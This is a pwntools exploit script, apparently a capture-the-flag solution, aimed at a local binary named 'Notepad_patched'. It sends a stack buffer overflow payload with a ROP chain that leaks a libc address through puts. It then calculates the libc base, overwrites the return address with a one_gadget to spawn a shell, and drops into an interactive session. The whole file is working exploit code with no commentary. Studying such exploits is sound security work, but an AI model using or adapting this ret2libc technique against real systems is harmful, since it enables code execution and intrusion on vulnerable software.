from pwn import *

exe = ELF('./Notepad_patched', checksec = False)
libc = ELF('./libc6_2.39-0ubuntu8.4_amd64.so', checksec = False)

p = process(exe.path)

libcarr = [0xe39fb, 0x102482, 0x10248a, 0x10248f]

input()
p.sendlineafter(b'content-----\n', b'`')

pop_rdi = 0x0000000000400c73
payload = b'a'*0x1e8
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
p.sendafter(b'message-----\n', payload)

#leak libc 
p.recvuntil(b'-)\n')
libc_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym['puts']
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

p.sendlineafter(b'content-----\n', b'`')
one_gadget = libc.address + 0xe39fb
payload = b'a'*0x1e8
payload += p64(one_gadget)
p.sendafter(b'message-----\n', payload)

p.interactive()